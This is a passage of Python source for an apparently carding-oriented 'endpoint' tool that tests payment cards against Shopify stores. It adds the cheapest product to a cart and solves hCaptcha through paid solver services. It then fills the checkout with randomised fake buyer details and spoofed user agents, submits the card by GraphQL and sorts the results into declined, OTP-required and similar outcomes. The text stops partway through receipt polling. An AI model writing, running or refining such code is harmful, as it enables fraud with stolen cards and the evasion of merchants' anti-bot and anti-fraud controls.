import os
import asyncio
import random
import re
import json
from urllib.parse import urlparse

import httpx
from fake_useragent import UserAgent
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
import uvicorn

# Optional captcha solver libraries
try:
    from twocaptcha import TwoCaptcha
    TWOCAPTCHA_AVAILABLE = True
except ImportError:
    TWOCAPTCHA_AVAILABLE = False

try:
    import capsolver
    CAPSOLVER_AVAILABLE = True
except ImportError:
    CAPSOLVER_AVAILABLE = False

# ------------------------------------------------------------
#  Helper: extract substring between two markers
# ------------------------------------------------------------
def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

# ------------------------------------------------------------
#  Extract hCaptcha sitekey from HTML
# ------------------------------------------------------------
def extract_hcaptcha_sitekey(html):
    match = re.search(r'<div[^>]*class=["\']h-captcha["\'][^>]*data-sitekey=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    return None

# ------------------------------------------------------------
#  Captcha solvers
# ------------------------------------------------------------
def solve_hcaptcha_2captcha(api_key, sitekey, page_url):
    if not TWOCAPTCHA_AVAILABLE:
        print("❌ 2captcha-python not installed. Run: pip install 2captcha-python")
        return None
    solver = TwoCaptcha(api_key)
    try:
        result = solver.hcaptcha(sitekey=sitekey, url=page_url)
        return result['code']
    except Exception as e:
        print(f"❌ 2Captcha error: {e}")
        return None

def solve_hcaptcha_capsolver(api_key, sitekey, page_url):
    if not CAPSOLVER_AVAILABLE:
        print("❌ capsolver not installed. Run: pip install capsolver")
        return None
    capsolver.api_key = api_key
    try:
        solution = capsolver.solve({
            "type": "HCaptchaTaskProxyless",
            "websiteURL": page_url,
            "websiteKey": sitekey,
        })
        return solution.get("gRecaptchaResponse")
    except Exception as e:
        print(f"❌ CapSolver error: {e}")
        return None

def solve_hcaptcha(solver_name, api_key, sitekey, page_url):
    if solver_name == "2captcha":
        return solve_hcaptcha_2captcha(api_key, sitekey, page_url)
    elif solver_name == "capsolver":
        return solve_hcaptcha_capsolver(api_key, sitekey, page_url)
    else:
        print(f"❌ Unsupported solver: {solver_name}")
        return None

# ------------------------------------------------------------
#  Extract payment methods from checkout page (Enhanced version from shop.py)
# ------------------------------------------------------------
def extract_payment_methods(html):
    """
    Enhanced payment method extraction based on shop.py patterns
    Returns a dictionary mapping payment method identifiers to their names
    """
    patterns = [
        r'window\.__PRELOAD_STATE__\s*=\s*({.*?});',
        r'window\.__INITIAL_STATE__\s*=\s*({.*?});',
        r'<script[^>]*>\s*var\s+Shopify\s*=\s*({.*?});\s*</script>',
    ]
    
    # Try to extract from JSON patterns first
    for pattern in patterns:
        match = re.search(pattern, html, re.DOTALL)
        if match:
            try:
                # Clean up the JSON string
                json_str = match.group(1).replace("&quot;", '"')
                state = json.loads(json_str)
                
                # Look for payment methods in various locations
                if 'checkout' in state and 'paymentMethods' in state['checkout']:
                    methods = state['checkout']['paymentMethods']
                elif 'paymentMethods' in state:
                    methods = state['paymentMethods']
                else:
                    # Search recursively for payment methods
                    for key, value in state.items():
                        if isinstance(value, list) and len(value) > 0:
                            if any('identifier' in item for item in value if isinstance(item, dict)):
                                methods = value
                                break
                    else:
                        continue
                
                mapping = {}
                for method in methods:
                    if isinstance(method, dict):
                        if 'identifier' in method:
                            identifier = method['identifier']
                            name = method.get('name') or method.get('displayName') or identifier
                            mapping[identifier] = name
                
                if mapping:
                    return mapping
            except json.JSONDecodeError:
                continue
            except Exception:
                continue
    
    # Direct extraction from HTML using shop.py patterns
    identifier_patterns = [
        r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
        r'"paymentMethodIdentifier":"([^"]+)"',
        r"'paymentMethodIdentifier':'([^']+)'",
        r'data-payment-method-identifier="([^"]+)"',
        r'data-payment-method="([^"]+)"',
    ]
    
    name_patterns = [
        r'paymentMethodName&quot;:&quot;([^&]+)&quot;',
        r'"paymentMethodName":"([^"]+)"',
        r"'paymentMethodName':'([^']+)'",
        r'data-payment-method-name="([^"]+)"',
    ]
    
    # Extract all identifiers and try to match with names
    identifiers = []
    for pattern in identifier_patterns:
        matches = re.findall(pattern, html)
        identifiers.extend(matches)
    
    if identifiers:
        # Try to find corresponding names
        mapping = {}
        names = []
        for pattern in name_patterns:
            matches = re.findall(pattern, html)
            names.extend(matches)
        
        # If we have both identifiers and names, pair them
        if len(identifiers) == len(names):
            for i, identifier in enumerate(identifiers):
                mapping[identifier] = names[i]
        else:
            # Just use identifiers as keys with placeholder names
            for identifier in set(identifiers):  # Use set to remove duplicates
                mapping[identifier] = identifier
    
    return mapping

# ------------------------------------------------------------
#  Gateway name mapping (enhanced with direct gateway names only - no hash detection)
# ------------------------------------------------------------
def map_gateway(identifier, method_map=None):
    """
    Enhanced gateway mapping based on common Shopify payment identifiers
    Returns direct gateway names without hash fallbacks
    """
    # First check if we have a mapping from the page
    if method_map and identifier in method_map:
        return method_map[identifier]
    
    if not identifier:
        return "Unknown"
    
    identifier_lower = identifier.lower()
    
    # Shopify Payments
    if any(x in identifier_lower for x in ['shopify', 'shopify_payments']):
        return "Shopify Payments"
    
    # Authorize.net
    if any(x in identifier_lower for x in ['authorize', 'authorize.net', 'authorizenet']):
        return "Authorize.net"
    
    # Stripe
    if any(x in identifier_lower for x in ['stripe', 'stripe_payments']):
        return "Stripe"
    
    # PayPal
    if any(x in identifier_lower for x in ['paypal', 'paypal_express', 'paypal_payments']):
        return "PayPal"
    
    # Braintree
    if any(x in identifier_lower for x in ['braintree', 'braintree_payments']):
        return "Braintree"
    
    # Adyen
    if any(x in identifier_lower for x in ['adyen', 'adyen_payments']):
        return "Adyen"
    
    # Klarna
    if any(x in identifier_lower for x in ['klarna', 'klarna_payments']):
        return "Klarna"
    
    # Afterpay / Clearpay
    if any(x in identifier_lower for x in ['afterpay', 'clearpay']):
        return "Afterpay"
    
    # Amazon Pay
    if any(x in identifier_lower for x in ['amazon', 'amazon_payments']):
        return "Amazon Pay"
    
    # Apple Pay
    if any(x in identifier_lower for x in ['apple', 'apple_pay']):
        return "Apple Pay"
    
    # Google Pay
    if any(x in identifier_lower for x in ['google', 'google_pay']):
        return "Google Pay"
    
    # Return the original identifier if no match found (no hash detection)
    return identifier

# ------------------------------------------------------------
#  Shopify automation class
# ------------------------------------------------------------
class ShopifyAuto:
    def __init__(self):
        self.user_agent = UserAgent().random

    async def get_random_info(self):
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

# ------------------------------------------------------------
#  Create httpx client with proxy support
# ------------------------------------------------------------
def create_async_client(proxy_url=None):
    common_kwargs = {
        'follow_redirects': True,
        'timeout': 30.0
    }
    if proxy_url:
        try:
            return httpx.AsyncClient(proxies=proxy_url, **common_kwargs)
        except TypeError:
            pass
        try:
            return httpx.AsyncClient(proxy=proxy_url, **common_kwargs)
        except TypeError:
            print("⚠️ Proxy not supported by httpx version, continuing without proxy.")
    return httpx.AsyncClient(**common_kwargs)

# ------------------------------------------------------------
#  Get minimum priced product from Shopify store
# ------------------------------------------------------------
async def get_minimum_price_product(session, site_url, headers):
    """Fetch all products and find the one with minimum price"""
    print("\n🔍 Searching for minimum priced product...")
    
    # Try to get products from /products.json first (paginated)
    all_products = []
    page = 1
    
    while True:
        products_url = f"{site_url}/products.json?page={page}&limit=250"
        product_resp = await session.get(products_url, headers=headers)
        
        if product_resp.status_code != 200:
            break
            
        products_data = product_resp.json()
        products = products_data.get('products', [])
        
        if not products:
            break
            
        all_products.extend(products)
        page += 1
        
        # Check if we've reached the last page
        if len(products) < 250:
            break
    
    if not all_products:
        # Fallback to collections if products.json fails
        collections_url = f"{site_url}/collections/all/products.json?limit=250"
        product_resp = await session.get(collections_url, headers=headers)
        if product_resp.status_code == 200:
            products_data = product_resp.json()
            all_products = products_data.get('products', [])
    
    if not all_products:
        raise Exception("No products found on the store")
    
    # Find minimum priced product
    min_price_product = None
    min_price = float('inf')
    min_variant = None
    
    for product in all_products:
        for variant in product.get('variants', []):
            try:
                price = float(variant.get('price', 0))
                if price < min_price and price > 0:  # Only consider positive prices
                    min_price = price
                    min_price_product = product
                    min_variant = variant
            except (ValueError, TypeError):
                continue
    
    if not min_price_product or not min_variant:
        raise Exception("Could not find a valid product with price")
    
    return {
        'product': min_price_product,
        'variant': min_variant,
        'price': min_price,
        'title': min_price_product.get('title', 'Unknown'),
        'handle': min_price_product.get('handle', ''),
        'variant_id': min_variant.get('id'),
        'product_id': min_price_product.get('id')
    }

# ------------------------------------------------------------
#  Core checkout logic
# ------------------------------------------------------------
async def run_shopify_checkout(site_url: str, cc: str, month: str, year: str, cvv: str,
                               proxy: str = None, solver: str = None, solver_key: str = None):
    print("\033[1;35;40m" + r"""
 ██╗  ██╗ █████╗ ███████╗██████╗ ███████╗███╗   ██╗
 ╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║
  ╚███╔╝ ███████║█████╗  ██║  ██║█████╗  ██╔██╗ ██║
  ██╔██╗ ██╔══██║██╔══╝  ██║  ██║██╔══╝  ██║╚██╗██║
 ██╔╝ ██╗██║  ██║███████╗██████╔╝███████╗██║ ╚████║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝

Gear Name - 𝐌𝐢𝐧𝐢 - 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭
Type - Endpoint (Auto Minimum Price)
Developer: xaed3n.t.me 
Join: for more tools
Channel: syncchats.t.me
                                                      
    """ + "\033[0m")

    result = {
        "Response": "UNKNOWN",
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Price": None,
        "Gate": "Unknown",
        "Site": site_url,
        "details": {}
    }

    proxy_url = None
    if proxy:
        try:
            parts = proxy.split(':')
            if len(parts) >= 4:
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
            elif len(parts) == 2:
                proxy_url = f"http://{parts[0]}:{parts[1]}"
        except Exception as e:
            result["details"]["proxy_error"] = str(e)

    client = create_async_client(proxy_url)
    async with client as session:
        try:
            shop = ShopifyAuto()

            # 1. Fetch minimum priced product
            print("\n\033[96m📦 Fetching products to find minimum price...\033[0m")
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.6',
                'user-agent': shop.user_agent,
            }
            
            min_product = await get_minimum_price_product(session, site_url, headers)
            variant_id = min_product['variant_id']
            price = min_product['price']
            result["Price"] = str(price)
            
            print(f"\033[92m✅ Found minimum priced product:\033[0m")
            print(f"\033[93m   Product: {min_product['title']}\033[0m")
            print(f"\033[93m   Product ID: {min_product['product_id']}\033[0m")
            print(f"\033[93m   Variant ID: {variant_id}\033[0m")
            print(f"\033[93m   Price: ${price}\033[0m")

            # 2. Add to cart
            print("\n\033[96m🛒 Adding product to cart\033[0m")
            headers['user-agent'] = UserAgent().random
            await session.get(site_url + '/cart.js', headers=headers)

            add_data = {'id': str(variant_id), 'quantity': '1', 'form_type': 'product'}
            add_resp = await session.post(site_url + '/cart/add.js', headers=headers, data=add_data)
            if add_resp.status_code != 200:
                print(f"\033[91mFailed to add product: {add_resp.status_code}\033[0m")
                result["Response"] = "ERROR"
                result["details"]["error"] = f"Failed to add product: {add_resp.status_code}"
                return result
            print("\033[92m✅ Item added to cart\033[0m")

            cart_resp = await session.get(site_url + '/cart.js', headers=headers)
            cart_data = cart_resp.json()
            token = cart_data['token']
            print(f"\033[93m   Cart token: {token}\033[0m")
            print(f"\033[93m   Items in cart: {cart_data['item_count']}\033[0m")

            # 3. Navigate to checkout and extract tokens
            print("\n\033[96m💳 Let's go to checkout page!\033[0m")
            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
                'referer': f"{site_url}/cart",
                'upgrade-insecure-requests': '1',
                'user-agent': headers['user-agent'],
            }

            await session.get(f"{site_url}/checkout", headers=checkout_headers)
            checkout_data = {'checkout': '', 'updates[]': '1'}
            checkout_resp = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
            response_text = checkout_resp.text

            # ----- hCaptcha solving -----
            if solver and solver_key:
                hcaptcha_sitekey = extract_hcaptcha_sitekey(response_text)
                if hcaptcha_sitekey:
                    print(f"\n\033[96m🧠 Captcha detected by hCaptcha! Sitekey:[ {hcaptcha_sitekey}] Solving with {solver}...\033[0m")
                    page_url = f"{site_url}/checkouts/{token}"
                    captcha_token = solve_hcaptcha(solver, solver_key, hcaptcha_sitekey, page_url)
                    if captcha_token:
                        print(f"\033[92m🧠 Solved hCaptcha token: {captcha_token[:30]}...\033[0m")
                        checkout_data['h-captcha-response'] = captcha_token
                        checkout_resp = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
                        response_text = checkout_resp.text
                    else:
                        print("\033[91m🧠 Failed to solve captcha. SKIP\033[0m")
                        result["Response"] = "CAPTCHA_FAILED"
                        return result

            # Extract tokens using enhanced methods from shop.py
            session_token_match = re.search(
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                response_text
            )
            session_token = session_token_match.group(1) if session_token_match else None

            if not session_token:
                # Fallback to other patterns
                session_token = find_between(response_text, 'serialized-session-token" content="&quot;', '&quot;"')
            
            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                queue_token = find_between(response_text, '"queueToken":"', '"')
            
            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                stable_id = find_between(response_text, '"stableId":"', '"')
            
            # Gateway/Payment Method Identifier extraction (from shop.py)
            paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not paymentMethodIdentifier:
                paymentMethodIdentifier = find_between(response_text, '"paymentMethodIdentifier":"', '"')
            if not paymentMethodIdentifier:
                payment_matches = re.findall(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', response_text)
                if payment_matches:
                    paymentMethodIdentifier = payment_matches[0]

            # EXTRACT checkoutCardsinkCallerIdentificationSignature (JWT)
            identification_signature = None
            sig_match = re.search(r'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;(eyJ[^&"]{20,})', response_text)
            if sig_match:
                identification_signature = sig_match.group(1)
            if not identification_signature:
                sig_match = re.search(r'"checkoutCardsinkCallerIdentificationSignature":"(eyJ[^"]+)"', response_text)
                if sig_match:
                    identification_signature = sig_match.group(1)
            if not identification_signature:
                sig_match = re.search(r'checkoutCardsinkCallerIdentificationSignature=([^&"\']+)', response_text)
                if sig_match:
                    identification_signature = sig_match.group(1)

            # EXTRACT checkout_id and build_id for browser headers
            checkout_id = token  # fallback
            build_id = 'FALLBACK_BUILD_ID_202506'  # hardcoded fallback
            # try to get checkout ID from HTML
            cid_match = re.search(r'"checkoutId":"([^"]+)"', response_text)
            if cid_match:
                checkout_id = cid_match.group(1)
            else:
                cid_match = re.search(r'checkoutId&quot;:&quot;([^&"]+)', response_text)
                if cid_match:
                    checkout_id = cid_match.group(1)
            # try to get build ID
            bid_match = re.search(r'"buildId":"([^"]+)"', response_text)
            if bid_match:
                build_id = bid_match.group(1)
            else:
                bid_match = re.search(r'buildId&quot;:&quot;([^&"]+)', response_text)
                if bid_match:
                    build_id = bid_match.group(1)

            if not all([session_token, queue_token, stable_id, paymentMethodIdentifier]):
                print("\033[91m⚠️ Failed to extract tokens!\033[0m")
                result["Response"] = "ERROR"
                result["details"]["error"] = "Failed to extract tokens!"
                return result

            print(f"\033[93m   ⏳ Length of sessionToken: {len(session_token)}\033[0m")
            print(f"\033[93m   queue_token: {queue_token}\033[0m")
            print(f"\033[93m   stable_id: {stable_id}\033[0m")
            print(f"\033[93m   paymentMethodIdentifier: {paymentMethodIdentifier}\033[0m")
            if identification_signature:
                print(f"\033[93m   identificationSignature: {identification_signature[:30]}...\033[0m")
            print(f"\033[93m   checkout_id: {checkout_id}\033[0m")
            print(f"\033[93m   build_id: {build_id}\033[0m")

            # Extract payment methods mapping (enhanced version from shop.py)
            method_map = extract_payment_methods(response_text)
            if method_map:
                print(f"\033[93m   👌 We've extracted payment map: {method_map}\033[0m")

            # Detect gateway using enhanced mapping (no hash detection)
            gateway_name = map_gateway(paymentMethodIdentifier, method_map)
            result["Gate"] = gateway_name
            print(f"\033[93m   Detected gateway type: {gateway_name}\033[0m")

            # 4. Get random user info
            print("\n\033[96m🌌 Using random info:\033[0m")
            info = await shop.get_random_info()
            fname, lname, email, phone = info["fname"], info["lname"], info["email"], info["phone"]
            add1, city, state_short, zip_code = info["add1"], info["city"], info["state_short"], info["zip"]
            print(f"\033[93m   Using: {fname} {lname}, {add1}, {city}, {state_short} {zip_code}, {phone}\033[0m")

            # 5. Create payment session (tokenization)
            print("\n\033[96mCreating new payment session:\033[0m")
            session_endpoints = [
                "https://checkout.pci.shopifyinc.com/sessions",  # NEW PCI endpoint (first)
                "https://deposit.us.shopifycs.com/sessions",     # fallback
                "https://checkout.shopifycs.com/sessions"        # fallback
            ]
            session_id = None
            for endpoint in session_endpoints:
                try:
                    print(f"   Trying {endpoint}...")
                    tok_headers = {
                        'authority': urlparse(endpoint).netloc,
                        'accept': 'application/json',
                        'content-type': 'application/json',
                        'origin': 'https://checkout.shopifycs.com',
                        'referer': 'https://checkout.shopifycs.com/',
                        'user-agent': shop.user_agent,
                    }
                    # Add identification signature if we have it
                    if identification_signature:
                        tok_headers['shopify-identification-signature'] = identification_signature
                    
                    token_payload = {
                        'credit_card': {
                            'number': cc,
                            'month': month,
                            'year': year,
                            'verification_value': cvv,
                            'name': f"{fname} {lname}",
                        },
                        'payment_session_scope': urlparse(site_url).netloc,
                    }
                    pay_resp = await session.post(endpoint, headers=tok_headers, json=token_payload, timeout=7)
                    if pay_resp.status_code == 200:
                        data = pay_resp.json()
                        if 'id' in data:
                            session_id = data['id']
                            print(f"\033[92m   📌 Done! We got payment ID: {session_id}\033[0m")
                            break
                    else:
                        print(f"   ⚠️ Failed {pay_resp.status_code}")
                except Exception as e:
                    print(f"   ⚠️ Error: {e}")
                    continue

            if not session_id:
                print("\033[91m🎑 Could not create payment\033[0m")
                result["Response"] = "ERROR"
                result["details"]["error"] = "Could not create payment session"
                return result

            # 6. GraphQL payment submission
            print("\n\033[96mSubmitting to endpoint via GraphQL\033[0m")
            graphql_url = f"{site_url}/checkouts/unstable/graphql"
            
            # Browser identity headers (fix 3)
            graphql_headers = {
                'authority': urlparse(site_url).netloc,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': site_url,
                'referer': f"{site_url}/",
                'user-agent': shop.user_agent,
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',  # NEW header
                'x-checkout-web-source-id': checkout_id,
                'x-checkout-web-build-id': build_id,
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{checkout_id}", type="cn"',
            }

            random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

            graphql_payload = {
                "query": "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}",
                "variables": {
                    "input": {
                        "checkpointData": None,
                        "sessionInput": {"sessionToken": session_token},
                        "queueToken": queue_token,
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [
                                {
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyMatchingConditions": {
                                            "estimatedTimeInTransit": {"any": True},
                                            "shipments": {"any": True},
                                        },
                                        "options": {},
                                    },
                                    "targetMerchandiseLines": {
                                        "lines": [{"stableId": stable_id}],
                                    },
                                    "destination": {
                                        "streetAddress": {
                                            "address1": add1,
                                            "address2": "",
                                            "city": city,
                                            "countryCode": "US",
                                            "postalCode": zip_code,
                                            "company": "",
                                            "firstName": fname,
                                            "lastName": lname,
                                            "zoneCode": state_short,
                                            "phone": phone,
                                        },
                                    },
                                    "deliveryMethodTypes": ["SHIPPING"],
                                    "expectedTotalPrice": {"any": True},
                                    "destinationChanged": True,
                                }
                            ],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": False,
                            "prefetchShippingRatesStrategy": None,
                        },
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": stable_id,
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                            "properties": [],
                                            "sellingPlanId": None,
                                            "sellingPlanDigest": None,
                                        },
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {"any": True},
                                    "lineComponentsSource": None,
                                    "lineComponents": [],
                                }
                            ],
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": paymentMethodIdentifier,
                                            "sessionId": session_id,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": add1,
                                                    "address2": "",
                                                    "city": city,
                                                    "countryCode": "US",
                                                    "postalCode": zip_code,
                                                    "company": "",
                                                    "firstName": fname,
                                                    "lastName": lname,
                                                    "zoneCode": state_short,
                                                    "phone": phone,
                                                },
                                            },
                                            "cardSource": None,
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }
                            ],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": add1,
                                    "address2": "",
                                    "city": city,
                                    "countryCode": "US",
                                    "postalCode": zip_code,
                                    "company": "",
                                    "firstName": fname,
                                    "lastName": lname,
                                    "zoneCode": state_short,
                                    "phone": phone,
                                },
                            },
                        },
                        "buyerIdentity": {
                            "buyerIdentity": {
                                "presentmentCurrency": "USD",
                                "countryCode": "US",
                            },
                            "contactInfoV2": {
                                "emailOrSms": {"value": email, "emailOrSmsChanged": False},
                            },
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"countryCode": "US"},
                        },
                        "tip": {"tipLines": []},
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": [],
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None,
                            "signatureUuid": None,
                            "lineItemScriptChanges": [],
                            "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                    },
                    "attemptToken": f"{token}-{random.random()}",
                    "metafields": [],
                    "analytics": {
                        "requestUrl": f"{site_url}/checkouts/cn/{token}",
                        "pageId": random_page_id,
                    },
                },
                "operationName": "SubmitForCompletion",
            }

            for attempt in range(2):
                print(f"\n   Attempting submission {attempt+1}/2...")
                gql_resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                if gql_resp.status_code != 200:
                    print(f"   ⚠️ GraphQL response {gql_resp.status_code}")
                    if attempt == 0:
                        await asyncio.sleep(2)
                        continue
                    result["Response"] = "ERROR"
                    result["details"]["error"] = f"GraphQL submission failed {gql_resp.status_code}"
                    return result

                gql_data = gql_resp.json()
                print(f"\033[93m   Got graphql response\033[0m")
                completion = gql_data.get('data', {}).get('submitForCompletion', {})
                r_typename = completion.get('__typename', '')

                # Check for errors first
                if completion.get('errors'):
                    error_codes = [e.get('code') for e in completion['errors'] if 'code' in e]
                    soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                    if all(code in soft_errors for code in error_codes) and attempt == 0:
                        print("   ⚠️ Got soft errors")
                        await asyncio.sleep(2)
                        continue
                    else:
                        print(f"\033[91m❌ Got Payment errors: {error_codes}\033[0m")
                        result["Response"] = "CARD_DECLINED"
                        result["details"]["errors"] = error_codes
                        if completion.get('errors') and len(completion['errors']) > 0:
                            err = completion['errors'][0]
                            result["details"]["error"] = {
                                "code": err.get('code'),
                                "messageUntranslated": err.get('localizedMessage', ''),
                                "__typename": err.get('__typename')
                            }
                        return result

                if completion.get('reason'):
                    print(f"\033[91m❌ Got Payment errors: {completion['reason']}\033[0m")
                    result["Response"] = "CARD_DECLINED"
                    result["details"]["reason"] = completion['reason']
                    return result

                # --- FIX 4: Check __typename NOW before polling ---
                if r_typename == 'ActionRequiredReceipt':
                    print(f"\033[93m🔐 3DS Required - ActionRequiredReceipt returned directly\033[0m")
                    result["Response"] = "OTP_REQUIRED"
                    result["details"]["type"] = "ActionRequiredReceipt"
                    # Try to extract offsiteRedirect from the receipt
                    receipt = completion.get('receipt', {})
                    if receipt and receipt.get('id'):
                        result["details"]["receipt_id"] = receipt['id']
                    # Also check for action field in the completion
                    action = completion.get('action')
                    if action and action.get('offsiteRedirect'):
                        result["details"]["redirect_url"] = action['offsiteRedirect']['url']
                    # Poll for offsite redirect if not found in completion
                    if not result["details"].get("redirect_url") and receipt and receipt.get('id'):
                        # Try to poll once to get the action
                        poll_payload = {
                            "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}",
                            "variables": {
                                "receiptId": receipt['id'],
                                "sessionToken": session_token,
                            },
                            "operationName": "PollForReceipt",
                        }
                        poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                        if poll_resp.status_code == 200:
                            poll_data = poll_resp.json()
                            poll_receipt = poll_data.get('data', {}).get('receipt', {})
                            action = poll_receipt.get('action')
                            if action and action.get('offsiteRedirect'):
                                result["details"]["redirect_url"] = action['offsiteRedirect']['url']
                    return result

                receipt = completion.get('receipt')
                if receipt and receipt.get('id'):
                    receipt_id = receipt['id']
                    print(f"\n\033[96m⏳ Polling for receipt status...\033[0m")
                    poll_payload = {
                        "query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}",
                        "variables": {
                            "receiptId": receipt_id,
                            "sessionToken": session_token,
                        },
                        "operationName": "PollForReceipt",
                    }
                    for poll in range(10):
                        print(f"   Poll attempt {poll+1}/10...")
                        await asyncio.sleep(3)
                        poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                        if poll_resp.status_code == 200:
                            poll_data = poll_resp.json()
                            receipt = poll_data.get('data', {}).get('receipt', {})
